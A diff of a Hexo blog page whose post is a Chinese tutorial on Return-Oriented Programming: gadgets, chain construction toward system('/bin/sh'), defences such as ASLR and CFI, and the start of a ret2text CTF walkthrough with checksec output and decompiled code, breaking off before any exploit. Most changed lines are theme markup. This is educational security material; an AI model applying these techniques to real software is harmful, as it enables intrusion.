@@ -1,336 +1,205 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang=en>
 <head>
-  <meta charset="UTF-8">
-
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/SecureNexusLab.png">
-  <link rel="icon" href="/img/SecureNexusLab.png">
-  
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="zer0ptr">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1.">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Basic ROP Learning">
 <meta property="og:url" content="https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/index.html">
 <meta property="og:site_name" content="zer0ptr&#39;s Blog">
-<meta property="og:description" content="Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1.">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:description" content="Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。">
+<meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-04-19T05:55:32.000Z">
 <meta property="article:modified_time" content="2025-06-27T12:28:39.439Z">
 <meta property="article:author" content="zer0ptr">
 <meta property="article:tag" content="Pwn">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-  
-  <title>Basic ROP Learning - zer0ptr&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cat.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cat.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cat.png">
+        
+      
+    
+    <!-- title -->
+    <title>Basic ROP Learning</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+    <!-- Umami Analytics -->
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-
-
-  
-<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"zer0ptr.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-  <script src="/js/sakura.js"></script>
-  <script src="/js/love.js"></script>
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
 <meta name="generator" content="Hexo 7.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
 
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/zer0ptr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&text=Basic ROP Learning"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&is_video=false&description=Basic ROP Learning"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Basic ROP Learning&body=Check out this article: https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&title=Basic ROP Learning"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&name=Basic ROP Learning&description=&lt;h2 id=&#34;Basic-ROP-Learning&#34;&gt;&lt;a href=&#34;#Basic-ROP-Learning&#34; class=&#34;headerlink&#34; title=&#34;Basic-ROP-Learning&#34;&gt;&lt;/a&gt;Basic-ROP-Learning&lt;/h2&gt;&lt;h2 id=&#34;ROP-Return-Oriented-Programming-概述&#34;&gt;&lt;a href=&#34;#ROP-Return-Oriented-Programming-概述&#34; class=&#34;headerlink&#34; title=&#34;ROP(Return-Oriented Programming)概述&#34;&gt;&lt;/a&gt;ROP(Return-Oriented Programming)概述&lt;/h2&gt;&lt;p&gt;ROP(Return-Oriented Programming)是一种高级的&lt;strong&gt;代码复用攻击技术&lt;/strong&gt;，主要用于绕过现代操作系统的安全防护机制（如DEP&amp;#x2F;NX）。其核心思想是在&lt;strong&gt;栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-基本概念&#34;&gt;&lt;a href=&#34;#1-基本概念&#34; class=&#34;headerlink&#34; title=&#34;1. 基本概念&#34;&gt;&lt;/a&gt;1. &lt;strong&gt;基本概念&lt;/strong&gt;&lt;/h3&gt;&lt;h4 id=&#34;（1）产生背景&#34;&gt;&lt;a href=&#34;#（1）产生背景&#34; class=&#34;headerlink&#34; title=&#34;（1）产生背景&#34;&gt;&lt;/a&gt;（1）产生背景&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;DEP&amp;#x2F;NX防护&lt;/strong&gt;：现代系统禁止执行栈&amp;#x2F;堆上的代码（数据执行保护）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;ASLR防护&lt;/strong&gt;：随机化内存布局，增加预测难度。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;ROP应对方案&lt;/strong&gt;：复用已有代码（&lt;code&gt;.text&lt;/code&gt;段），避免直接注入shellcode。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://zer0ptr.github.io/2025/04/19/Basic-ROP-Learning/&t=Basic ROP Learning"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-<body>
-  
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-ROP-Learning"><span class="toc-number">1.</span> <span class="toc-text">Basic-ROP-Learning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Return-Oriented-Programming-%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">ROP(Return-Oriented Programming)概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">1. 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF"><span class="toc-number">2.1.1.</span> <span class="toc-text">（1）产生背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.2.</span> <span class="toc-text">（2）核心原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">2. 关键组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.3.</span> <span class="toc-text">3. 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">2.4.</span> <span class="toc-text">4. 防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%9E%E4%BE%8B-Linux-x86-ROP-Exploit"><span class="toc-number">2.5.</span> <span class="toc-text">5.实例 Linux x86 ROP Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-ret2text"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">(1) ret2text</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">2.5.1.</span> <span class="toc-text">基本分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%88%86%E6%9E%90"><span class="toc-number">2.5.2.</span> <span class="toc-text">栈内存布局分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%8C%9C%E6%83%B3"><span class="toc-number">2.5.3.</span> <span class="toc-text">验证猜想</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
 
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
   <header>
     
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Basic ROP Learning
+    </h1>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>zer0ptr&#39;s blog</strong>
-    </a>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">zer0ptr</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-19T05:55:32.000Z" class="dt-published" itemprop="datePublished">2025-04-19</time>
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
+        (Updated: <time datetime="2025-06-27T12:28:39.439Z" class="dt-updated" itemprop="dateModified">2025-06-27</time>)
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
+      
     </div>
-  </div>
-</nav>
 
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>
+    </div>
+
+
+    </div>
+  </header>
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/background.PNG') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="Basic ROP Learning"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-19 13:55" pubdate>
-          2025年4月19日 下午
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.2k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          11 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">Basic ROP Learning</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="basic-rop-learning">Basic-ROP-Learning</h2>
-<h2 id="rop-return-oriented-programming-概述">ROP(Return-Oriented Programming)概述</h2>
-<p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
-<h3 id="1-基本概念">1. <strong>基本概念</strong></h3>
-<h4 id="1-产生背景">（1）产生背景</h4>
-<ul>
-<li>
-<p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p>
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Basic-ROP-Learning"><a href="#Basic-ROP-Learning" class="headerlink" title="Basic-ROP-Learning"></a>Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述"><a href="#ROP-Return-Oriented-Programming-概述" class="headerlink" title="ROP(Return-Oriented Programming)概述"></a>ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. <strong>基本概念</strong></h3><h4 id="（1）产生背景"><a href="#（1）产生背景" class="headerlink" title="（1）产生背景"></a>（1）产生背景</h4><ul>
+<li><p><strong>DEP&#x2F;NX防护</strong>：现代系统禁止执行栈&#x2F;堆上的代码（数据执行保护）。</p>
 </li>
-<li>
-<p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p>
+<li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p>
 </li>
-<li>
-<p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p>
+<li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p>
 </li>
 </ul>
 <span id="more"></span>
-<h4 id="2-核心原理">（2）核心原理</h4>
-<ul>
-<li>
-<p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p>
+<h4 id="（2）核心原理"><a href="#（2）核心原理" class="headerlink" title="（2）核心原理"></a>（2）核心原理</h4><ul>
+<li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p>
 </li>
-<li>
-<p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成&quot;代码链&quot;。</p>
+<li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成”代码链”。</p>
 </li>
 </ul>
 <hr>
-<h3 id="2-关键组件">2. <strong>关键组件</strong></h3>
-<table>
+<h3 id="2-关键组件"><a href="#2-关键组件" class="headerlink" title="2. 关键组件"></a>2. <strong>关键组件</strong></h3><table>
 <thead>
 <tr>
 <th>组件</th>
 <th>作用</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td><strong>Gadget</strong></td>
 <td>程序中原有的短指令序列（通常以<code>ret</code>结尾），实现基本操作（如读写寄存器）。</td>
 </tr>
@@ -340,49 +209,41 @@
 </tr>
 <tr>
 <td><strong>Stack Pivot</strong></td>
-<td>将栈指针（ESP/RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td>
+<td>将栈指针（ESP&#x2F;RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <hr>
-<h3 id="3-攻击步骤">3. <strong>攻击步骤</strong></h3>
-<ol>
-<li>
-<p><strong>信息泄露</strong></p>
+<h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3. 攻击步骤"></a>3. <strong>攻击步骤</strong></h3><ol>
+<li><p><strong>信息泄露</strong></p>
 <ul>
 <li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li>
 </ul>
 </li>
-<li>
-<p><strong>寻找Gadgets</strong></p>
+<li><p><strong>寻找Gadgets</strong></p>
 <ul>
 <li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li>
 </ul>
 </li>
-<li>
-<p><strong>构造ROP Chain</strong></p>
+<li><p><strong>构造ROP Chain</strong></p>
 <ul>
 <li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li>
 </ul>
 </li>
-<li>
-<p><strong>触发漏洞</strong></p>
+<li><p><strong>触发漏洞</strong></p>
 <ul>
 <li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li>
 </ul>
 </li>
 </ol>
 <hr>
-<h3 id="4-防御措施">4. <strong>防御措施</strong></h3>
-<table>
+<h3 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. <strong>防御措施</strong></h3><table>
 <thead>
 <tr>
 <th>防御技术</th>
 <th>原理</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td><strong>ASLR</strong></td>
 <td>随机化内存布局，增加gadget地址预测难度。</td>
 </tr>
@@ -395,148 +256,50 @@
 <td>控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。</td>
 </tr>
 <tr>
-<td><strong>PIC/PIE</strong></td>
+<td><strong>PIC&#x2F;PIE</strong></td>
 <td>位置无关代码，增强ASLR效果。</td>
 </tr>
-</tbody>
-</table>
-<h3 id="5-实例-linux-x86-rop-exploit">5.实例 Linux x86 ROP Exploit</h3>
-<h5 id="1-ret2text">(1) ret2text</h5>
-<ul>
-<li>
-<h4 id="基本分析"><strong>基本分析</strong></h4>
-</li>
+</tbody></table>
+<h3 id="5-实例-Linux-x86-ROP-Exploit"><a href="#5-实例-Linux-x86-ROP-Exploit" class="headerlink" title="5.实例 Linux x86 ROP Exploit"></a>5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="(1) ret2text"></a>(1) ret2text</h5><ul>
+<li><h4 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a><strong>基本分析</strong></h4></li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p>
 <p>先看看程序的保护机制</p>
-<div class="code-wrapper"><pre><code class="hljs Bash">~ checksec ret2text
-[*] <span class="hljs-string">&#x27;/ret2text&#x27;</span>
-    Arch:       i386-32-little
-    RELRO:      Partial RELRO
-    Stack:      No canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x8048000)
-    Stripped:   No
-    Debuginfo:  Yes</code></pre></div>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~ checksec ret2text</span><br><span class="line">[*] <span class="string">&#x27;/ret2text&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
 <p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p>
-<div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span>
-<span class="hljs-function"></span>&#123;
-  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span>
